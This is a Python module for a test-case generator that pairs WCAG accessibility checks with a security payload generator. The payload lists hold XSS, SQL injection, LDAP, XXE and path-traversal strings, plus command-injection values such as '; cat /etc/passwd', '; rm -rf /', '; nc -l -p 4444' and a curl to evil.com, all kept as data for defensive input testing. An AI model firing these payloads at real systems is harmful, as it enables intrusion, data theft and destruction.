"""
Security and Accessibility Validation Framework

This module provides comprehensive security and accessibility validation capabilities
for the exploratory test case generator, implementing automated checks and validation
rules to ensure generated test cases include security and accessibility considerations.

Key Features:
- Automated security vulnerability detection and testing
- WCAG accessibility compliance validation
- Security payload generation and testing scenarios
- Accessibility checker integration for generated test cases
- Risk-based security assessment
- Performance impact analysis for accessibility features
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Set, Tuple
from enum import Enum
import re
import json
from datetime import datetime
import uuid


class SecurityVulnerabilityType(Enum):
    """Types of security vulnerabilities to test."""
    XSS = "Cross-Site Scripting"
    SQL_INJECTION = "SQL Injection"
    CSRF = "Cross-Site Request Forgery"
    AUTHENTICATION_BYPASS = "Authentication Bypass"
    SESSION_HIJACKING = "Session Hijacking"
    DIRECTORY_TRAVERSAL = "Directory Traversal"
    COMMAND_INJECTION = "Command Injection"
    LDAP_INJECTION = "LDAP Injection"
    XML_INJECTION = "XML Injection"
    CLICKJACKING = "Clickjacking"
    INSECURE_DIRECT_OBJECT_REFERENCE = "Insecure Direct Object Reference"


class AccessibilityStandard(Enum):
    """Accessibility standards and guidelines."""
    WCAG_2_1_A = "WCAG 2.1 Level A"
    WCAG_2_1_AA = "WCAG 2.1 Level AA"
    WCAG_2_1_AAA = "WCAG 2.1 Level AAA"
    SECTION_508 = "Section 508"
    ADA = "Americans with Disabilities Act"


class SecurityRiskLevel(Enum):
    """Security risk assessment levels."""
    CRITICAL = "critical"    # Immediate threat to system security
    HIGH = "high"           # Significant security risk
    MEDIUM = "medium"       # Moderate security concern
    LOW = "low"            # Minor security issue
    INFO = "informational"  # Security awareness


@dataclass
class SecurityPayload:
    """Security test payload with metadata."""
    payload_id: str
    vulnerability_type: SecurityVulnerabilityType
    payload_data: str
    description: str
    expected_behavior: str
    risk_level: SecurityRiskLevel
    test_scenarios: List[str] = field(default_factory=list)
    encoded_variants: List[str] = field(default_factory=list)
    
    def __post_init__(self):
        if not self.payload_id:
            self.payload_id = f"payload_{uuid.uuid4().hex[:8]}"


@dataclass
class AccessibilityCheck:
    """Accessibility validation check."""
    check_id: str
    standard: AccessibilityStandard
    guideline: str
    check_description: str
    validation_method: str  # automated, manual, semi-automated
    success_criteria: str
    failure_scenarios: List[str] = field(default_factory=list)
    assistive_tech_impact: List[str] = field(default_factory=list)
    
    def __post_init__(self):
        if not self.check_id:
            self.check_id = f"a11y_{uuid.uuid4().hex[:8]}"


@dataclass
class SecurityTestResult:
    """Result of security vulnerability testing."""
    test_id: str
    vulnerability_type: SecurityVulnerabilityType
    payload_used: str
    test_passed: bool
    vulnerability_detected: bool
    risk_assessment: SecurityRiskLevel
    details: str
    recommendations: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class AccessibilityTestResult:
    """Result of accessibility testing."""
    test_id: str
    standard: AccessibilityStandard
    check_passed: bool
    issues_found: List[str] = field(default_factory=list)
    severity_level: str = "medium"  # low, medium, high, critical
    user_impact: str = ""
    remediation_steps: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class SecurityPayloadGenerator:
    """Generator for security testing payloads."""
    
    def __init__(self):
        self.payload_templates = {
            SecurityVulnerabilityType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=\"alert('XSS')\">",
                "<audio src=x onerror=alert('XSS')>",
                "'-alert('XSS')-'",
                "\";alert('XSS');//"
            ],
            SecurityVulnerabilityType.SQL_INJECTION: [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, username, password FROM users --",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 1=1 --",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "1' OR '1'='1",
                "' HAVING 1=1 --",
                "' GROUP BY columnnames HAVING 1=1 --",
                "' ORDER BY 1 --"
            ],
            SecurityVulnerabilityType.COMMAND_INJECTION: [
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "&& ls -la",
                "|| ls -la",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; ping -c 4 127.0.0.1",
                "; whoami",
                "; id",
                "`ls -la`",
                "$(ls -la)",
                "; nc -l -p 4444",
                "; rm -rf /",
                "; curl http://evil.com"
            ],
            SecurityVulnerabilityType.LDAP_INJECTION: [
                "*",
                "*)(&",
                "*)(uid=*",
                "*)(|(uid=*",
                "*))%00",
                "admin)(&(password=*",
                "*)(|(password=*",
                "*)(userPassword=*",
                "*)(cn=*",
                "*)(mail=*"
            ],
            SecurityVulnerabilityType.XML_INJECTION: [
                "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/evil.xml\">]>",
                "<![CDATA[<script>alert('XXE')</script>]]>",
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>"
            ],
            SecurityVulnerabilityType.DIRECTORY_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd",
                "\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ]
        }
        
        self.encoding_variants = [
            lambda x: x,  # No encoding
            lambda x: x.replace('<', '%3C').replace('>', '%3E'),  # URL encoding
            lambda x: x.replace('<', '&lt;').replace('>', '&gt;'),  # HTML encoding
            lambda x: ''.join(f'%{ord(c):02x}' for c in x),  # Full URL encoding
            lambda x: x.replace("'", "''"),  # SQL escaping
            lambda x: x.replace('"', '\\"'),  # JSON escaping
        ]
    
    def generate_payloads_for_vulnerability(self, vuln_type: SecurityVulnerabilityType, 
                                          include_encoded: bool = True) -> List[SecurityPayload]:
        """Generate payloads for a specific vulnerability type."""
        payloads = []
        templates = self.payload_templates.get(vuln_type, [])
        
        for i, template in enumerate(templates):
            # Generate base payload
            payload = SecurityPayload(
                payload_id=f"{vuln_type.name.lower()}_{i+1}",
                vulnerability_type=vuln_type,
                payload_data=template,
                description=f"Test payload for {vuln_type.value}",
                expected_behavior="Application should reject or sanitize input",
                risk_level=self._assess_payload_risk(vuln_type, template),
                test_scenarios=self._generate_test_scenarios(vuln_type, template)
            )
            
            # Generate encoded variants if requested
            if include_encoded:
                for j, encoder in enumerate(self.encoding_variants[1:], 1):  # Skip identity encoder
                    try:
                        encoded_payload = encoder(template)
                        payload.encoded_variants.append(encoded_payload)
                    except Exception:
                        continue  # Skip if encoding fails
            
            payloads.append(payload)
        
        return payloads
    
    def generate_comprehensive_payload_suite(self) -> Dict[SecurityVulnerabilityType, List[SecurityPayload]]:
        """Generate comprehensive security payload suite for all vulnerability types."""
        payload_suite = {}
        
        for vuln_type in SecurityVulnerabilityType:
            payload_suite[vuln_type] = self.generate_payloads_for_vulnerability(vuln_type)
        
        return payload_suite
    
    def _assess_payload_risk(self, vuln_type: SecurityVulnerabilityType, payload: str) -> SecurityRiskLevel:
        """Assess risk level of a payload."""
        high_risk_indicators = ['drop table', 'delete from', 'rm -rf', '/etc/passwd', 'system(']
        medium_risk_indicators = ['alert(', 'script>', 'union select', 'or 1=1']
        
        payload_lower = payload.lower()
        
        if any(indicator in payload_lower for indicator in high_risk_indicators):
            return SecurityRiskLevel.HIGH
        elif any(indicator in payload_lower for indicator in medium_risk_indicators):
            return SecurityRiskLevel.MEDIUM
        else:
            return SecurityRiskLevel.LOW
    
    def _generate_test_scenarios(self, vuln_type: SecurityVulnerabilityType, payload: str) -> List[str]:
        """Generate test scenarios for a payload."""
        base_scenarios = {
            SecurityVulnerabilityType.XSS: [
                "Input payload in text fields",
                "Submit payload in form data",
                "Include payload in URL parameters",
                "Test payload in search functionality",
                "Verify payload doesn't execute in browser"
            ],
            SecurityVulnerabilityType.SQL_INJECTION: [
                "Submit payload in login forms",
                "Test payload in search queries",
                "Include payload in registration data",
                "Test payload in filter parameters",
                "Verify database queries are parameterized"
            ],
            SecurityVulnerabilityType.COMMAND_INJECTION: [
                "Input payload in system command fields",
                "Test payload in file upload names",
                "Include payload in configuration settings",
                "Test payload in export/import functions",
                "Verify command execution is restricted"
            ]
        }
        
        return base_scenarios.get(vuln_type, [
            "Input payload in relevant fields",
            "Verify application handles payload securely",
            "Check for proper input validation",
            "Ensure no unintended execution occurs"
        ])


class AccessibilityChecker:
    """Comprehensive accessibility validation checker."""
    
    def __init__(self):
        self.wcag_checks = self._initialize_wcag_checks()
        self.automated_checks = self._initialize_automated_checks()
        self.manual_checks = self._initialize_manual_checks()
    
    def _initialize_wcag_checks(self) -> List[AccessibilityCheck]:
        """Initialize WCAG 2.1 compliance checks."""
        return [
            AccessibilityCheck(
                check_id="wcag_1_1_1",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="1.1.1 Non-text Content",
                check_description="All images must have appropriate alt text",
                validation_method="automated",
                success_criteria="All img elements have non-empty alt attributes",
                failure_scenarios=["Images without alt attributes", "Empty alt text on informative images"],
                assistive_tech_impact=["Screen readers cannot describe images"]
            ),
            AccessibilityCheck(
                check_id="wcag_1_3_1",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="1.3.1 Info and Relationships",
                check_description="Form inputs must have associated labels",
                validation_method="automated",
                success_criteria="All form inputs have labels or aria-label",
                failure_scenarios=["Inputs without labels", "Labels not properly associated"],
                assistive_tech_impact=["Screen readers cannot identify input purpose"]
            ),
            AccessibilityCheck(
                check_id="wcag_1_4_3",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="1.4.3 Contrast (Minimum)",
                check_description="Text must have sufficient color contrast",
                validation_method="automated",
                success_criteria="Text has contrast ratio of at least 4.5:1",
                failure_scenarios=["Low contrast text", "Insufficient color difference"],
                assistive_tech_impact=["Users with low vision cannot read text"]
            ),
            AccessibilityCheck(
                check_id="wcag_2_1_1",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="2.1.1 Keyboard",
                check_description="All functionality must be keyboard accessible",
                validation_method="manual",
                success_criteria="All interactive elements can be reached and activated with keyboard",
                failure_scenarios=["Mouse-only interactions", "Keyboard traps", "Unreachable elements"],
                assistive_tech_impact=["Keyboard users cannot access functionality"]
            ),
            AccessibilityCheck(
                check_id="wcag_2_4_1",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="2.4.1 Bypass Blocks",
                check_description="Provide skip links for repetitive content",
                validation_method="manual",
                success_criteria="Skip links present for navigation and main content",
                failure_scenarios=["No skip links", "Non-functional skip links"],
                assistive_tech_impact=["Users must navigate through repetitive content"]
            ),
            AccessibilityCheck(
                check_id="wcag_2_4_3",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="2.4.3 Focus Order",
                check_description="Focus order must be logical and meaningful",
                validation_method="manual",
                success_criteria="Tab order follows logical reading sequence",
                failure_scenarios=["Illogical tab order", "Missing focus indicators"],
                assistive_tech_impact=["Confusing navigation for keyboard users"]
            ),
            AccessibilityCheck(
                check_id="wcag_3_2_2",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="3.2.2 On Input",
                check_description="Changing form inputs should not cause unexpected context changes",
                validation_method="manual",
                success_criteria="Form inputs don't automatically submit or change context",
                failure_scenarios=["Auto-submitting forms", "Unexpected page changes"],
                assistive_tech_impact=["Unexpected changes disorient users"]
            ),
            AccessibilityCheck(
                check_id="wcag_4_1_2",
                standard=AccessibilityStandard.WCAG_2_1_AA,
                guideline="4.1.2 Name, Role, Value",
                check_description="UI components must have accessible names and roles",
                validation_method="automated",
                success_criteria="All UI components have proper ARIA attributes",
                failure_scenarios=["Missing ARIA labels", "Incorrect roles"],
                assistive_tech_impact=["Screen readers cannot identify component purpose"]
            )
        ]
    
    def _initialize_automated_checks(self) -> List[str]:
        """Initialize list of automated accessibility checks."""
        return [
            "Check for missing alt text on images",
            "Validate form label associations",
            "Check color contrast ratios",
            "Validate heading structure hierarchy",
            "Check for duplicate IDs",
            "Validate ARIA attributes",
            "Check for empty links or buttons",
            "Validate table headers",
            "Check for proper language attributes",
            "Validate focus management"
        ]
    
    def _initialize_manual_checks(self) -> List[str]:
        """Initialize list of manual accessibility checks."""
        return [
            "Test keyboard navigation flow",
            "Verify screen reader announcements",
            "Test with high contrast mode",
            "Verify zoom functionality up to 200%",
            "Test with different assistive technologies",
            "Check focus indicators visibility",
            "Verify skip link functionality",
            "Test error message associations",
            "Check animation and motion preferences",
            "Verify timeout and session handling"
        ]
    
    def generate_accessibility_test_scenarios(self, element_type: str, 
                                            interaction_type: str) -> List[AccessibilityCheck]:
        """Generate accessibility test scenarios for specific elements and interactions."""
        relevant_checks = []
        
        # Element-specific checks
        element_checks = {
            'button': [
                AccessibilityCheck(
                    check_id=f"button_a11y_{uuid.uuid4().hex[:8]}",
                    standard=AccessibilityStandard.WCAG_2_1_AA,
                    guideline="4.1.2 Name, Role, Value",
                    check_description="Button must have accessible name",
                    validation_method="automated",
                    success_criteria="Button has text content, aria-label, or aria-labelledby",
                    failure_scenarios=["Empty button text", "Missing aria-label"],
                    assistive_tech_impact=["Screen readers cannot announce button purpose"]
                )
            ],
            'input': [
                AccessibilityCheck(
                    check_id=f"input_a11y_{uuid.uuid4().hex[:8]}",
                    standard=AccessibilityStandard.WCAG_2_1_AA,
                    guideline="1.3.1 Info and Relationships",
                    check_description="Input must have associated label",
                    validation_method="automated",
                    success_criteria="Input has label, aria-label, or aria-labelledby",
                    failure_scenarios=["Input without label", "Incorrectly associated label"],
                    assistive_tech_impact=["Users cannot identify input purpose"]
                )
            ],
            'link': [
                AccessibilityCheck(
                    check_id=f"link_a11y_{uuid.uuid4().hex[:8]}",
                    standard=AccessibilityStandard.WCAG_2_1_AA,
                    guideline="2.4.4 Link Purpose",
                    check_description="Link purpose must be clear from link text",
                    validation_method="manual",
                    success_criteria="Link text describes destination or purpose",
                    failure_scenarios=["Generic 'click here' links", "Ambiguous link text"],
                    assistive_tech_impact=["Users cannot understand link purpose"]
                )
            ]
        }
        
        # Interaction-specific checks
        interaction_checks = {
            'click': [
                AccessibilityCheck(
                    check_id=f"click_a11y_{uuid.uuid4().hex[:8]}",
                    standard=AccessibilityStandard.WCAG_2_1_AA,
                    guideline="2.1.1 Keyboard",
                    check_description="Click action must be keyboard accessible",
                    validation_method="manual",
                    success_criteria="Element can be activated with Enter or Space key",
                    failure_scenarios=["Mouse-only click handlers", "Missing keyboard events"],
                    assistive_tech_impact=["Keyboard users cannot activate element"]
                )
            ],
            'focus': [
                AccessibilityCheck(
                    check_id=f"focus_a11y_{uuid.uuid4().hex[:8]}",
                    standard=AccessibilityStandard.WCAG_2_1_AA,
                    guideline="2.4.7 Focus Visible",
                    check_description="Focused element must have visible focus indicator",
                    validation_method="manual",
                    success_criteria="Focus indicator is clearly visible",
                    failure_scenarios=["Removed focus outlines", "Invisible focus indicators"],
                    assistive_tech_impact=["Users cannot see which element has focus"]
                )
            ]
        }
        
        # Add relevant checks based on element and interaction types
        relevant_checks.extend(element_checks.get(element_type, []))
        relevant_checks.extend(interaction_checks.get(interaction_type, []))
        
        return relevant_checks
    
    def validate_test_case_accessibility(self, test_case_steps: List[Dict[str, Any]]) -> List[AccessibilityTestResult]:
        """Validate accessibility compliance for test case steps."""
        results = []
        
        for step in test_case_steps:
            action_type = step.get('action_type', '')
            selector = step.get('selector', '')
            
            # Determine element type from selector
            element_type = self._extract_element_type(selector)
            
            # Get relevant accessibility checks
            relevant_checks = self.generate_accessibility_test_scenarios(element_type, action_type)
            
            # Validate each check
            for check in relevant_checks:
                result = self._validate_single_check(step, check)
                results.append(result)
        
        return results
    
    def _extract_element_type(self, selector: str) -> str:
        """Extract element type from selector."""
        if 'button' in selector.lower() or '[type="button"]' in selector:
            return 'button'
        elif 'input' in selector.lower() or '[type=' in selector:
            return 'input'
        elif 'a[' in selector or 'link' in selector.lower():
            return 'link'
        elif 'img' in selector.lower():
            return 'image'
        elif 'form' in selector.lower():
            return 'form'
        else:
            return 'generic'
    
    def _validate_single_check(self, step: Dict[str, Any], check: AccessibilityCheck) -> AccessibilityTestResult:
        """Validate a single accessibility check against a step."""
        # This would integrate with actual accessibility testing tools
        # For now, we'll create a framework for the validation
        
        test_result = AccessibilityTestResult(
            test_id=f"a11y_test_{uuid.uuid4().hex[:8]}",
            standard=check.standard,
            check_passed=True,  # Would be determined by actual validation
            issues_found=[],
            severity_level="medium",
            user_impact="",
            remediation_steps=[]
        )
        
        # Example validation logic (would be replaced with actual tool integration)
        selector = step.get('selector', '')
        action_type = step.get('action_type', '')
        
        # Check for common accessibility issues
        if check.guideline.startswith("1.1.1") and 'img' in selector:
            if 'alt=' not in selector:
                test_result.check_passed = False
                test_result.issues_found.append("Image selector suggests missing alt attribute")
                test_result.remediation_steps.append("Add alt attribute to image")
        
        if check.guideline.startswith("1.3.1") and 'input' in selector:
            if 'label' not in selector and 'aria-label' not in selector:
                test_result.check_passed = False
                test_result.issues_found.append("Input selector suggests missing label")
                test_result.remediation_steps.append("Associate input with label or add aria-label")
        
        if check.guideline.startswith("2.1.1") and action_type == 'click':
            test_result.remediation_steps.append("Verify element is keyboard accessible")
        
        return test_result


class SecurityAccessibilityValidator:
    """Integrated security and accessibility validator for test cases."""
    
    def __init__(self):
        self.security_generator = SecurityPayloadGenerator()
        self.accessibility_checker = AccessibilityChecker()
    
    def enhance_test_case_with_security_checks(self, test_case: Dict[str, Any]) -> Dict[str, Any]:
        """Enhance test case with security validation scenarios."""
        enhanced_case = test_case.copy()
        
        # Identify form inputs that need security testing
        form_steps = [step for step in test_case.get('steps', []) 
                     if step.get('action_type') == 'type']
        
        security_enhancements = []
        
        for step in form_steps:
            input_data = step.get('input_data', '')
            selector = step.get('selector', '')
            
            # Determine appropriate security tests based on field type
            field_type = self._determine_field_type(selector, input_data)
            relevant_vulns = self._get_relevant_vulnerabilities(field_type)
            
            for vuln_type in relevant_vulns:
                payloads = self.security_generator.generate_payloads_for_vulnerability(vuln_type)
                security_enhancements.append({
                    'step_number': step.get('step_number'),
                    'vulnerability_type': vuln_type.value,
                    'test_payloads': [p.payload_data for p in payloads[:3]],  # Limit to top 3
                    'expected_behavior': 'Input should be rejected or sanitized',
                    'risk_level': payloads[0].risk_level.value if payloads else 'medium'
                })
        
        enhanced_case['security_enhancements'] = security_enhancements
        return enhanced_case
    
    def enhance_test_case_with_accessibility_checks(self, test_case: Dict[str, Any]) -> Dict[str, Any]:
        """Enhance test case with accessibility validation scenarios."""
        enhanced_case = test_case.copy()
        
        # Generate accessibility validation for each step
        accessibility_validations = []
        
        for step in test_case.get('steps', []):
            action_type = step.get('action_type', '')
            selector = step.get('selector', '')
            
            # Generate relevant accessibility checks
            element_type = self.accessibility_checker._extract_element_type(selector)
            checks = self.accessibility_checker.generate_accessibility_test_scenarios(
                element_type, action_type
            )
            
            if checks:
                accessibility_validations.append({
                    'step_number': step.get('step_number'),
                    'element_type': element_type,
                    'accessibility_checks': [
                        {
                            'guideline': check.guideline,
                            'description': check.check_description,
                            'validation_method': check.validation_method,
                            'success_criteria': check.success_criteria
                        }
                        for check in checks
                    ]
                })
        
        enhanced_case['accessibility_validations'] = accessibility_validations
        return enhanced_case
    
    def generate_comprehensive_validation_report(self, test_cases: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate comprehensive security and accessibility validation report."""
        report = {
            'summary': {
                'total_test_cases': len(test_cases),
                'security_enhanced_cases': 0,
                'accessibility_enhanced_cases': 0,
                'total_security_checks': 0,
                'total_accessibility_checks': 0,
                'generated_at': datetime.now().isoformat()
            },
            'security_analysis': {
                'vulnerability_coverage': {},
                'risk_distribution': {},
                'recommended_payloads': []
            },
            'accessibility_analysis': {
                'wcag_compliance_level': 'AA',
                'guideline_coverage': {},
                'automation_coverage': 0,
                'manual_testing_required': []
            },
            'recommendations': [],
            'detailed_results': []
        }
        
        # Analyze each test case
        for test_case in test_cases:
            case_analysis = {
                'test_id': test_case.get('metadata', {}).get('test_id', 'unknown'),
                'security_score': 0,
                'accessibility_score': 0,
                'issues_found': [],
                'recommendations': []
            }
            
            # Enhance with security checks
            enhanced_security = self.enhance_test_case_with_security_checks(test_case)
            if 'security_enhancements' in enhanced_security:
                report['summary']['security_enhanced_cases'] += 1
                report['summary']['total_security_checks'] += len(enhanced_security['security_enhancements'])
                case_analysis['security_score'] = self._calculate_security_score(enhanced_security)
            
            # Enhance with accessibility checks  
            enhanced_accessibility = self.enhance_test_case_with_accessibility_checks(test_case)
            if 'accessibility_validations' in enhanced_accessibility:
                report['summary']['accessibility_enhanced_cases'] += 1
                accessibility_checks = sum(len(av['accessibility_checks']) 
                                         for av in enhanced_accessibility['accessibility_validations'])
                report['summary']['total_accessibility_checks'] += accessibility_checks
                case_analysis['accessibility_score'] = self._calculate_accessibility_score(enhanced_accessibility)
            
            report['detailed_results'].append(case_analysis)
        
        # Generate overall recommendations
        report['recommendations'] = self._generate_overall_recommendations(report)
        
        return report
    
    def _determine_field_type(self, selector: str, input_data: str) -> str:
        """Determine field type for security testing."""
        selector_lower = selector.lower()
        
        if 'password' in selector_lower:
            return 'password'
        elif 'email' in selector_lower or '@' in input_data:
            return 'email'
        elif 'search' in selector_lower:
            return 'search'
        elif 'comment' in selector_lower or 'message' in selector_lower:
            return 'text_area'
        elif 'url' in selector_lower or 'http' in input_data:
            return 'url'
        else:
            return 'text'
    
    def _get_relevant_vulnerabilities(self, field_type: str) -> List[SecurityVulnerabilityType]:
        """Get relevant vulnerability types for a field type."""
        vulnerability_mapping = {
            'text': [SecurityVulnerabilityType.XSS, SecurityVulnerabilityType.SQL_INJECTION],
            'text_area': [SecurityVulnerabilityType.XSS, SecurityVulnerabilityType.SQL_INJECTION],
            'search': [SecurityVulnerabilityType.XSS, SecurityVulnerabilityType.SQL_INJECTION],
            'email': [SecurityVulnerabilityType.XSS],
            'password': [SecurityVulnerabilityType.SQL_INJECTION],
            'url': [SecurityVulnerabilityType.XSS, SecurityVulnerabilityType.DIRECTORY_TRAVERSAL]
        }
        
        return vulnerability_mapping.get(field_type, [SecurityVulnerabilityType.XSS])
    
    def _calculate_security_score(self, enhanced_case: Dict[str, Any]) -> float:
        """Calculate security coverage score for a test case."""
        security_enhancements = enhanced_case.get('security_enhancements', [])
        if not security_enhancements:
            return 0.0
        
        # Base score for having security enhancements
        score = 50.0
        
        # Additional points for vulnerability coverage
        unique_vulns = set(se['vulnerability_type'] for se in security_enhancements)
        score += len(unique_vulns) * 15  # 15 points per vulnerability type
        
        # Additional points for comprehensive payloads
        total_payloads = sum(len(se['test_payloads']) for se in security_enhancements)
        score += min(25, total_payloads * 2)  # Max 25 points for payloads
        
        return min(100.0, score)
    
    def _calculate_accessibility_score(self, enhanced_case: Dict[str, Any]) -> float:
        """Calculate accessibility coverage score for a test case."""
        accessibility_validations = enhanced_case.get('accessibility_validations', [])
        if not accessibility_validations:
            return 0.0
        
        # Base score for having accessibility validations
        score = 40.0
        
        # Points for number of checks
        total_checks = sum(len(av['accessibility_checks']) for av in accessibility_validations)
        score += min(40, total_checks * 5)  # Max 40 points for checks
        
        # Points for automated vs manual coverage
        automated_checks = sum(1 for av in accessibility_validations 
                             for check in av['accessibility_checks'] 
                             if check['validation_method'] == 'automated')
        if automated_checks > 0:
            score += 20
        
        return min(100.0, score)
    
    def _generate_overall_recommendations(self, report: Dict[str, Any]) -> List[str]:
        """Generate overall recommendations based on analysis."""
        recommendations = []
        
        summary = report['summary']
        
        if summary['security_enhanced_cases'] < summary['total_test_cases'] * 0.5:
            recommendations.append("Increase security testing coverage - less than 50% of test cases include security validations")
        
        if summary['accessibility_enhanced_cases'] < summary['total_test_cases'] * 0.7:
            recommendations.append("Improve accessibility testing coverage - aim for at least 70% of test cases")
        
        if summary['total_security_checks'] < summary['total_test_cases'] * 2:
            recommendations.append("Add more comprehensive security checks - aim for multiple security validations per test case")
        
        recommendations.extend([
            "Implement automated security payload testing in CI/CD pipeline",
            "Include manual accessibility testing in test execution workflow",
            "Train QA team on security and accessibility testing best practices",
            "Establish security and accessibility quality gates for test case approval"
        ])
        
        return recommendations


# Utility functions for integration

def create_security_enhanced_test_step(base_step: Dict[str, Any], 
                                     vulnerability_types: List[SecurityVulnerabilityType]) -> Dict[str, Any]:
    """Create a security-enhanced test step."""
    enhanced_step = base_step.copy()
    generator = SecurityPayloadGenerator()
    
    security_tests = []
    for vuln_type in vulnerability_types:
        payloads = generator.generate_payloads_for_vulnerability(vuln_type)
        security_tests.append({
            'vulnerability_type': vuln_type.value,
            'test_payloads': [p.payload_data for p in payloads[:2]],  # Top 2 payloads
            'risk_level': payloads[0].risk_level.value if payloads else 'medium'
        })
    
    enhanced_step['security_tests'] = security_tests
    return enhanced_step


def create_accessibility_enhanced_test_step(base_step: Dict[str, Any]) -> Dict[str, Any]:
    """Create an accessibility-enhanced test step."""
    enhanced_step = base_step.copy()
    checker = AccessibilityChecker()
    
    action_type = base_step.get('action_type', '')
    selector = base_step.get('selector', '')
    element_type = checker._extract_element_type(selector)
    
    accessibility_checks = checker.generate_accessibility_test_scenarios(element_type, action_type)
    
    enhanced_step['accessibility_checks'] = [
        {
            'guideline': check.guideline,
            'description': check.check_description,
            'validation_method': check.validation_method,
            'success_criteria': check.success_criteria
        }
        for check in accessibility_checks
    ]
    
    return enhanced_step